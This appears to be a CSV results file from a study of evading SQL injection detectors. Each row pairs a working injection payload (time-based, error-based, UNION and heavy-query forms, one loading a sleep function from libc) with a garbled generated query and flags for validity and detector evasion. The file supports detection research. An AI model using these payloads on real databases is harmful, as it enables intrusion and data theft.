,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
2790,-6190') where 2621=2621 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,SELECT MIN(select) FROM SQL injection detection WHERE 2621 = 2621 = 2621 OR 4144 = 4144 ='select upper(xmltype(chr(113)||chr(113)||chr(106)||chr(62)),0,1,0,0,0,0,0
2791,"-6160'))) or make_set(1924=4415,4415) and ((('hayr'='hayr","SELECT DISTINCT (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((sql injection)) FROM SQL_injection)) FROM SELECT SELECT MIN(1924 = 4415,4415)) FROM SQL injection)) FROM SELECT __hayr) FROM SELECT __hayr)) FROM SQL injection))) FROM SQL injection))) FROM SELECT 'hayr')) FROM SQL injection)))) FROM SQL injection)))) FROM SQL injection)))) FROM SELECT '((((((((((((((((((((((((((((((((((",1,1,0,0,0,0,0
2792,1' and (3423=7789)*7789 and 'pdia' like 'pdia,"SELECT MIN(*)*7789, 'pdia' FROM SQL injection detection",1,1,1,1,1,1,1
2793,1');select (case when (7096=2568) then 7096 else 1/(select 0) end)--,SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
2794,-5020%') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=',SELECT MIN(case) FROM SQL injection detection),0,0,1,1,1,1,1
2795,"1' and elt(4249=4249,7259)","SELECT MIN(4249 = 4249,7259) FROM SQL injection detection",1,1,0,0,1,0,0
2796,"1))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8814=8814","SELECT * FROM SQL injection, SELECT MIN(*) FROM SQL_injection) FROM SQL_injection",1,1,1,1,1,1,1
2797,"1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded","SELECT DISTINCT elt(6272 = 6272,sleep(5)) FROM SQL injection detection",1,1,0,0,1,0,0
2798,"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('gmil'='gmil",SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = 1' OR name_users = 5286,1,1,0,0,0,0,0
2799,"1%"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) ORDER BY COUNT(*) DESC LIMIT 1",1,1,1,0,1,1,0
2800,1' and (3020=3020)*6703 and 'qsrz'='qsrz,SELECT MIN(3020 = 3020)*6703 FROM SQL injection detection WHERE NOT SQL injection detection = 'SQ',1,1,0,1,1,1,0
2801,1'||(select 'ptkj' from dual where 6263=6263 union all select null--,SELECT DISTINCT'select null--' FROM SQL injection',1,1,1,1,0,1,0
2802,"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph","SELECT DISTINCT elt(8190 = 8190,1) FROM (SELECT SQL_injection) FROM SQL_injection) AND (SELECT elt(8190 = 8190,1) FROM (SELECT elt(select) FROM (SELECT elt(8190 = 8190,1)) FROM (SELECT elt(select) FROM SQL injection) and (SELECT elt(vcph' ='sql injection') FROM (SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL SELECT SUM(select) FROM (SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL Query: 1')) FROM (SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL injection) and (SELECT elt(select) FROM (SELECT MIN(select) FROM SELECT, SQL_injection) FROM (SELECT MIN(",0,1,0,0,1,0,0
2803,"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","SELECT COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
2804,"1"") where 9855=9855;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",SELECT 6276 FROM SQL_injection_select WHERE NOT 6276 = 6276 AND NOT 6276 = 6276*(select) = 6276*(select) FROM SQL_injection_engineer_schema.character_sets),0,1,0,0,1,0,0
2805,"1"" and make_set(8403=8403,8899) and ""fqxr"" like ""fqxr","SELECT DISTINCT t1.fqxr FROM ""sqxr"" FROM ""sqxr"" FROM ""sqx injection"" AS t1 JOIN query: 1"" AND NOT 8403 = 8403,8899",1,1,1,0,0,0,0
2806,1'))) and 9198=9198--,SELECT MIN(9198=9198--) FROM SQL injection AS _evade_sq_injection_deficite) FROM SQL_injection_code WHERE NOT Query: 1') AND 9198 = 9198--,1,1,0,0,1,0,0
2807,"1,(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))","SELECT 7711*(select) FROM SQL injection AS _evade_sq_injection_details, query: 1(select) FROM information_schema.character_sets)",0,1,0,0,1,0,0
2808,1'||(select 'exls' where 3837=3837 and sleep(5))||',SELECT 'exls' FROM SQL injection detection,1,0,1,1,1,1,1
2809,"1"" where 7249=7249 union all select null,null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
2810,"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
2811,"1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM generate_series(1,5000000)-- SELECT MIN(select count(*) FROM generate_series(1,5000000) FROM SQL injection",1,1,0,0,1,0,0
2812,1'||(select 'tfqg' from dual where 9862=9862 and (select * from (select(sleep(5)))gcrr)#,SELECT MIN(select) FROM SQL injection detection WHERE NOT select(select(select(select(5)))gcrr) FROM SQL SELECT MIN(select) FROM query: 1'||(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM SQL injection detection),0,1,0,0,1,0,0
2813,"1') as tvqn where 2967=2967;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",SELECT * FROM SQL_injection WHERE NOTrdb$types = '2967=2967;select count(*) FROM SQL_injection',1,1,0,0,1,0,0
2814,"1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671","SELECT * FROM SQL_INSECT MIN(0x694a4745) = 8466 = 8466 = 8000000,md5(0x694a4745) AND (((8671 = 8671) FROM SQL_Injector",1,1,0,0,0,0,0
2815,-2516) where 3349=3349 or 4855=1806--,"SELECT COUNT(*) FROM query: -2516 WHERE ""3349 = 3349 = 3349 = 3349 = 3349 or 4855 = 1806--""",0,1,0,0,0,0,0
2816,"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",SELECT MIN(%) FROM SQL injection,1,0,0,1,1,1,0
2817,"1%"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""%""=""",SELECT MIN(select) FROM SQL injection_detection,0,0,0,1,1,1,0
2818,"1))) union all select null,null,null,null#","SELECT null,null,null FROM SQL - SELECT MIN(null) FROM SQL - injecting FROM SQL - SELECT MIN(null) FROM SQL - injecting",1,1,1,1,1,1,1
2819,"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('dhqz'='dhqz",SELECT SUM(*) FROM SQL injection detection),1,0,1,1,1,1,1
2820,"-1065)) union all select 7437,7437,7437,7437,7437,7437,7437,7437--","SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 7437,7437,7437,7437,7437-- SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql)",1,1,0,0,1,0,0
2821,"1%"" and make_set(2905=5725,5725) and ""%""=""","SELECT MIN(2905 = 5725,5725) FROM SQL injection detection",1,1,1,1,1,1,1
2822,"1%' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",SELECT * FROM SQL_injections WHERE NOT SQL_injection_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_detect_: '%',1,0,0,1,1,1,0
2823,"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (5098=5098",SELECT SUM(*) FROM SQL injection detection,1,0,1,1,1,1,1
2824,"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('brlc'='brlc","SELECT'sql injection' FROM table_repeat(right(5389),000000000), 'evadesq injection detection' FROM query: 1' or char(68)||char(85)|char(85) = 'brlc'",1,1,0,0,1,0,0
2825,-1549') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('fnwx'='fnwx,"SELECT MIN(select) FROM SQL injection,'sequence' FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select)||chr(112)||chr(select_select_select) FROM SELECT SELECT'select_select_select_select_select_select) FROM SELECT SELECT & fnwx FROM SQL SELECT & fnwx) FROM dual)",0,1,0,0,1,0,0
2826,"-4860') as azyx where 6901=6901 union all select 6901,6901,6901,6901,6901#",SELECT MIN(sql injection) FROM SQL_injection WHERE 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901 = 6901,1,1,1,0,0,0,0
2827,"1%') union all select null,null#","SELECT DISTINCT null,null# FROM SQL injection detection",1,0,1,1,0,1,0
2828,"1))) and 2388=benchmark(5000000,md5(0x6d457153))#","SELECT NOT md5(0x6d457153) FROM SQL AS t1 JOIN query: 1 JOIN benchmark(5000000,md5(0x6d457153) FROM query: SELECT NOT md5(0x6d457153) FROM SQL AS t2 ON t1.md5(0x6d457153) ='sq injection'",0,1,0,0,1,0,0
2829,"1"") where 3250=3250 union all select null#","SELECT MIN(SQL) FROM SQL SELECT SELECT DISTINCT null# FROM SQL SELECT SELECT DISTINCT SUM(SQL) FROM Query: 1"")",1,1,1,0,1,1,0
2830,"-2423'))) union all select 8256,8256,8256,8256,8256,8256,8256,8256--","SELECT DISTINCT 8256,8256,8256,8256,8256-- FROM SQL_Injection WHERE NOT SELECT DISTINCT SELECT DISTINCT ext.__code FROM SELECT DISTINCT ext.__code, MIN(ext.)) FROM SELECT DISTINCT SUM(sql injection) FROM SELECT DISTINCT SUM(sql injection) FROM Query: -2423')) FROM SQL_injection",0,1,0,1,1,1,0
2831,"-1748%""))) union all select 2987#",SELECT 2987# FROM SQL injection detection,1,0,1,1,1,1,1
2832,"1'+(select papc where 8900=8900 and elt(3114=3114,sleep(5))#","SELECT DISTINCT num(sleep(5))# FROM SQL injection_description WHERE NOT elt(3114 = 3114,sleep(5))# ='sq injection'",0,1,0,0,0,0,0
2833,"1)) as rwsn where 9946=9946 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","SELECT MIN(select) FROM SQL injection WHERE 9946 = 9946 OR extractvalue(1297,concat(0x7171706a71) = ""rwsn""",0,1,0,0,0,0,0
2834,"-3541"" or make_set(9354=9354,7185) and ""fgxu""=""fgxu","SELECT MIN(9354 = 9354,7185) FROM SQL injection_deficite",1,1,1,0,1,1,0
2835,1'+(select gguu where 7809=7809 union all select null--,SELECT MIN(select gguu) FROM SQL injection detection,1,1,0,1,1,1,0
2836,"-6680%"")) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",SELECT MIN(SQL) FROM SQL Injections,1,0,1,1,1,1,1
2837,1') as svtm where 7627=7627 rlike (select * from (select(sleep(5)))sgvo)--,SELECT MIN(select(sleep(5)))sgvo) FROM SQL injection detection,1,1,0,0,1,0,0
2838,"1'||(select 'jonh' from dual where 2415=2415 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(select 'jonh') FROM SQL injection,1,1,1,0,1,1,0
2839,"1%') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT COUNT(*) FROM SQL injection detection WHERE NOT sysusers as sys1,sysusers as sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7)--",1,1,0,0,0,0,0
2840,"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('sqnk'='sqnk",SELECT DISTINCT case FROM (SELECT SUM(sqnk) FROM SQL injection)),0,0,0,0,1,0,0
2841,"1"" and (7597=8422)*8422 and ""gywp"" like ""gywp","SELECT MIN(7597 = 8422)*8422 AND ""gywp"" ='sql injection detection'",0,1,1,0,0,0,0
2842,"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('pufu' like 'pufu","SELECT DISTINCT t1.((*) FROM'sql injection detection' FROM SQL_injection' AS t1 JOIN creation_series(1,5000000) and 8407 =(select count(*) FROM generate_series(1,5000000))",1,1,0,0,0,0,0
2843,"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('cpfn' like 'cpfn",SELECT'select count(*) FROM SQL injection detection',1,1,1,1,1,1,1
2844,1 and (3020=3020)*6703,SELECT * FROM query: 1 AND (3020 = 3020)*6703 FROM SQL query: 3020 = 3020,1,1,0,0,1,0,0
2845,"1'||(select 'tezo' from dual where 4436=4436;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",SELECT tezo FROM SQL - injection_methods ='sq injection',1,0,1,1,1,1,1
2846,"1)) as qfnu where 1609=1609 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT MIN(select count(*) FROM SQL injection) FROM sysibm.systables as t3-- SELECT t1.select count(*) FROM ssl injection detection WHERE sysibm.systables as t2,sysibm.systables as t3)-- SELECT t1.select count(*) FROM ssl_inputeg' FROM SQL SELECT SELECT MIN(select_num.systables as t2,sysibm.systables as t3) FROM SELECT SQL_injection,'sqfnu' FROM sysibm.systables as t3,sysibm.systables as t3)-- SELECT MIN(select count(*) FROM SQL injection'",1,1,0,0,0,0,0
2847,-8056)) as botl where 9225=9225 or (1182=7641)*7641--,SELECT * FROM SQL AS _8056__ as botl WHERE NOT SELECT * FROM Query: -8056)*7641-- FROM query: 1182 = 7641--,1,1,1,1,1,1,1
2848,"1'))) or elt(6272=6272,sleep(5)) and ((('ayjb' like 'ayjb","SELECT DISTINCT t1.sleep(5)) FROM elt(6272 = 6272,sleep(5)) or t(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((sleep(5)))) FROM SQL injection)) or SELECT SELECT MIN(sleep(5)) FROM elt(6272 = 6272,sleep(5)) FROM elt(6272 = 'ayjb)' FROM SQL injection)' AND NOT'sql injection)' FROM SELECT t2.sleep(5))) FROM SELECT t2.sleep(5))) FROM SELECT t2.sleep(5)) FROM SELECT t2.sleep(5)) FROM SELECT t2.sleep(5)) FROM SELECT t2.s",0,1,0,0,1,0,0
2849,"1) as iupg where 2861=2861 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT * FROM SQL_injection WHERE sysusers as sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7=(select count(*) FROM SQL injection detection)",1,1,0,0,0,0,0
2850,"1) where 5598=5598 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT * FROM SQL_injection WHERE 5598 = 5598 = 5598 AND NOTsysibm.systables as t2,sysibm.systables as t3)--",1,1,0,0,0,0,0
2851,"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gmvk' like 'gmvk","SELECT COUNT(*) FROM sysusers as sysusers as sysusers as sysusers as sysusers as sys4,sysusers as sys7) and (SELECT t1.select count(*) FROM sysusers AS t1 JOIN SQL injection detection AS t2 ON t1.sysusers = sysusers as sys7 ='sql''sql''sql injection')) FROM SELECT SELECT SUM(*) FROM SQL ='sql injection detection' AND NOT sysusers as sysusers as sysusers as sysusers as sys7' FROM SELECT t1.sysusers as sysusers as sysusers as sysusers as sys7' FROM SELECT t1.sysusers as sysusers as",1,1,0,0,0,0,0
2852,-2307'))) or 6872=6872 and ((('fyok' like 'fyok,SELECT DISTINCT'sql injection' FROM SQL_injection',0,0,1,1,1,1,1
2853,"1%') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","SELECT * FROM SQL_injection, SELECT MIN(excat(0x5c)) FROM SQL_injection",1,1,0,0,1,0,0
2854,"-2639"") where 1494=1494 union all select 1494--",SELECT MIN(sql injection) FROM SQL_injection WHERE 1494 = 1494 = 1494-- union All select 1494--,1,1,0,0,0,0,0
2855,"1""))) and elt(1210=1210,sleep(5)) and (((""felm""=""felm","SELECT DISTINCT elt(1210 = 1210,sleep(5)) FROM SQL injection detection",1,1,0,0,1,0,0
2856,1') as fyib where 9246=9246;select (case when (5085=4259) then 5085 else 5085*(select 5085 from mysql.db) end)#,SELECT MIN(5085 = 5885*(select 5085*(select 5085 from mysql.db) end) FROM SQL injection detection,1,1,0,0,1,0,0
2857,"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)","SELECT NOT SQL_substring(repeat(right(5389),5000000000) FROMregexp_substring(repeat(right(right(right(right(right(right) or query: 1) or char(69)||char(85) = regexp_substring(repeat(right(right(5389),5000000000),null) FROM query: query: or SQL injection query: 1) or query: char(68)||char(85) = ""valid""",1,1,0,0,1,0,0
2858,1)) as bjxd where 4299=4299;select pg_sleep(5)--,"SELECT pg_sleep(5)-- FROM SQL_Injection WHERE ""SQL injection"" = '4299=4299;select'",1,1,0,0,0,0,0
2859,1) as tngy where 8956=8956 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
2860,"1"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT MIN(*) FROM SQL injection detection WHERE NOTsysibm.systables as t2,sysibm.systables as t3)-- SELECT MIN(select count(*) FROM sysibm.systables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,1,0,0
2861,"-4300"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""klbu""=""klbu",SELECT klbu FROM SQL injections WHERE NOT klbu = 'ctxsys.drithsx.sn(5023 = 5023 = ctxsys.drith(5023)|chr(5023)|chr(5023)|chr(5023) FROM SELECT klbu FROM SQL injection detection,0,1,0,0,1,0,0
2862,"1"") where 2278=2278;if(7899=7899) select 7899 else drop function zbbp--",SELECT 7899 = 7899 else drop function zbbp-- FROM SQL injection,1,1,0,1,0,0,0
2863,"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# zwck",SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = 1,1,1,0,0,1,0,0
2864,"-8026 or elt(8434=4516,4516)# bsqo",SELECT * FROM query: -8026 ORDER BY query: -8026,1,1,1,1,1,1,1
2865,"1"")) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""vcjt"" like ""vcjt",SELECT vcjt FROM RESULT SELECT vcjt FROM SQL SELECT vcjt FROM RESULT,1,0,1,1,1,1,1
2866,"-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",SELECT MIN(5023 = 'ctxxsys.drithsx.sn(5023 = 'ctx injection detection') FROM SQL injection',1,1,0,0,1,0,0
2867,-8341 or 8571=8571--,SELECT * FROM query: -8341 or 8571 = 8571 - SELECT * FROM query: -8341 = -8341 ORDER BY query: -8341 = -8341 ORDER BY query: 8671 = 8571--,1,1,0,0,0,0,0
2868,1) as zzip where 5353=5353 and 3394=3092,SELECT * FROM Query: 1) as zzip WHERE NOT SQL_inject = '5353=5353' AND 3394 = 3092,1,1,0,0,1,0,0
2869,"1%"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
2870,1') rlike (select (case when (2721=8716) then 1 else 0x28 end)) and ('dumt'='dumt,SELECT (SELECT case FROM SQL injection detection) AND NOT (SELECT MIN(case) FROM SQL injection detection),0,1,1,1,1,1,1
2871,"1"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",SELECT MIN(0x544d5a4c) FROM SQL injections,1,1,0,1,1,1,0
2872,"1"")) as pqbs where 4409=4409;iif(1746=1730,1,1/0)","SELECT MIN(1,1,0) FROM SQL injection detection WHERE NOT iif(1746 = 1730,1,0) = ""SQBs""",1,1,0,0,0,0,0
2873,1')));select (case when (1227=4014) then 1227 else 1227*(select 1227 from mysql.db) end)#,SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
2874,"1"") where 2152=2152;select pg_sleep(5)--",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
2875,"1'||(select 'xyft' from dual where 8250=8250 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",SELECT MIN(select) FROM SQL injection detection WHERE NOT all_users ='sq injection',0,1,0,0,1,0,0
2876,"1"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",SELECT SUM(*) FROM SQL_injection WHERE NOT all_users = 1,1,1,0,0,1,0,0
2877,"1') as wpom where 2620=2620 and elt(3114=3114,sleep(5))#","SELECT MIN(sleep(5))# FROM SQL injection_diagnosis WHERE 2620 = 2620 AND elt(3114 = 3114,sleep(5))# = ""sql injection detection""",0,1,0,0,0,0,0
2878,"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--","SELECT DISTINCT t1.select, t1.select FROM SQL_inject_select AS t1 JOIN 3671 = 3671 AND t1.select ='sq injection detection' AND 4241 = t2.select",0,1,1,1,0,1,0
2879,"1"") where 5196=5196 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",SELECT MIN(6055 = 6055) FROM SQL injection detection WHERE NOT SELECT MIN(6055 = 5196),1,1,0,0,1,0,0
2880,"-3819'))) union all select 9014,9014,9014,9014,9014,9014--","SELECT 9014,9014,9014,9014-- FROM SQL_Injection WHERE NOT SELECT MIN(9014,9014,9014--) ='sq injection'",1,1,0,0,0,0,0
2881,1%' and (select * from (select(sleep(5)))gcrr)#,SELECT DISTINCT select(select(sleep(5))) FROM SQL injection_detective WHERE NOT SQL_injection_method_code ='sq injection',1,1,0,0,1,0,0
2882,"-6971"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ifuh"" like ""ifuh","SELECT DISTINCT case FROM SQL_injection, SELECT MIN(select) FROM Query: -6971"" OR 4747 = dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) ='sqlid_to_sqlhash(sqlid_to_sqlhash(sqlid_to_sqlhash((chr(4747 = dbms_utility.sqlid_to_sqlhash((chr(113)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)",0,1,0,0,0,0,0
2883,"1%"") and elt(1210=1210,sleep(5)) and (""%""=""",SELECT MIN(sleep(5)) FROM SQL injection detection,1,1,0,0,1,0,0
2884,"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""htyi""=""htyi",SELECT DISTINCT htyi FROM RESULT JOIN SQL injection detection' FROM RESULT,0,0,1,1,1,1,1
2885,"1 where 6169=6169 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",SELECT (SELECT SUM(select) FROM SQL_injection) FROM information_schema.system_users)-- if you are not able to do it.workload_substring(repeat(right(right(right(5451) FROM left) FROM information_schema.system_users)--,0,1,0,0,1,0,0
2886,"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('knhm'='knhm","SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECTSQ_Procedures WHERE NOT'sql injection'",1,0,1,1,1,1,1
2887,1')) as eymg where 7000=7000;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,SELECT 6276*(select) FROM SQL_injection AS _eymg_diagnosis AS _select WHERE 7000 = 7000;select (case when (6276 = 6276) AND 6276*(select 6276*(select 6276 from information_schema.character_sets) end) ='sql injection',0,1,0,0,0,0,0
2888,"1)) as somz where 1598=1598;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",SELECT MIN(select *) FROM SQL_injection WHERE NOT 45% = 1598 = 1598 = 1598;select * FROM generate_series(4592 = 4592) AND NOT 45% = 1 AND NOT 0 end_limit = 1,1,1,0,0,0,0,0
2889,"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
2890,"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('yvbb'='yvbb","SELECT * FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT domain.domain.columns = 't1,' AND domain.domain.tables as t3 AND (SELECT * FROM SQL_injection)",1,1,1,1,1,1,1
